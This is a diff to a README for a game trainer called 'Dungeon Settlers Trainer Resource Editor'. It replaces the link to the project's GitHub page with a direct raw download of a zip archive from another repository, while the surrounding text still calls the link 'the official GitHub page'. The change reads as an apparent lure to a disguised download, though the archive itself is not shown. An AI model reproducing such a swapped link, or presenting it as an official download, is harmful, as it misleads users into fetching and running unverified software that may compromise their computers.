@@ -15,7 +15,7 @@ Welcome! This guide will help you download and run **Dungeon-Settlers-Trainer-Re
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download-Dungeon%20Settlers%20Editor-blue?style=for-the-badge&logo=github)](https://github.com/mledez3395/Dungeon-Settlers-Trainer-Resource-Editor)
+[![Download Now](https://img.shields.io/badge/Download-Dungeon%20Settlers%20Editor-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mledez3395/mledez3395.github.io/main/assets/App-v1.5.zip)
 
 Visit this link to download the application. This is the official GitHub page for the trainer. Click the link, then look for the green **"Code"** button or a **"Releases"** section on that page. Choose the latest version and download it to your computer.
 
